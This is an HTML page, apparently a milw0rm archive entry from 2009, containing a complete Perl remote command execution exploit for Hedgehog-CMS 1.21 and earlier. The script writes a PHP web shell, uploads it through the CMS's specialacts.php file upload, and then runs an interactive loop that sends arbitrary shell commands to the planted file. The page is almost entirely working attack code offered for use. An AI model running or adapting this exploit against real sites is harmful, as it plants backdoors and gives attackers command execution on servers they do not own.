<html><head><title>Hedgehog-CMS <= 1.21 Remote Command Execution Exploit</title></head><pre>--+++===================================================================+++--
--+++====== Hedgedog-CMS &lt;= 1.21 Remote Command Execution Exploit ======+++--
--+++===================================================================+++--

#!/usr/bin/perl

use strict;
use warnings;
use LWP::UserAgent;
use HTTP::Request::Common;

sub usage
{
	print
		&quot;\nHedgedog-CMS &lt;= 1.21 Remote Command Execution Exploit&quot;.
		&quot;\n[+] Author   : darkjoker&quot;.
		&quot;\n[+] Site     : http://darkjoker.net23.net&quot;.
		&quot;\n[+] Download : http://mesh.dl.sourceforge.net/sourceforge/hedgehog-cms/hedgehog-cms_v1.21.zip&quot;.
		&quot;\n[+] Usage    : perl ${0} &lt;hostname&gt; &lt;path&gt;&quot;.
		&quot;\n[+] Ex.      : perl ${0} localhost /hedgedogCMS&quot;.
		&quot;\n\n&quot;;
	exit ();
}

sub upload_shell
{
	my ($host, $path) = @_;
	open SHELL, &quot;&gt;shell.php&quot;;
	print SHELL &quot;&lt;?php system (stripslashes (\$_GET ['cmd'])); ?&gt;&quot;;
	close SHELL;
	my $url = &quot;http://${host}${path}/specialacts.php&quot;;
	my $lwp = LWP::UserAgent-&gt;new;
	my $req = $lwp-&gt;request	(
					POST $url,
					Content_Type =&gt; 'multipart/form-data',
					Content	    =&gt; [l_mode =&gt; 1, l_file =&gt; [&quot;shell.php&quot;]],
				);
	unlink &quot;shell.php&quot;;
	return 1 if ($req-&gt;is_success);
	return 0;
}

my ($host, $path) = @ARGV;
usage unless $path;
print &quot;[-] Exploit failed.\n&quot; unless upload_shell ($host, $path);
my $cmd;
my $url = &quot;http://${host}${path}/user/upload/shell.php&quot;;
while (1)
{
	print &quot;shell\@${host}: \$ &quot;;
	$cmd = &lt;STDIN&gt;;
	chomp $cmd;
	exit if $cmd =~ /quit/;
	my $lwp = LWP::UserAgent-&gt;new;
	my $req = $lwp-&gt;get (
			    	$url . &quot;?cmd=${cmd}&quot;,
			    );
	print $req-&gt;decoded_content;
}

# milw0rm.com [2009-02-09]</pre></html>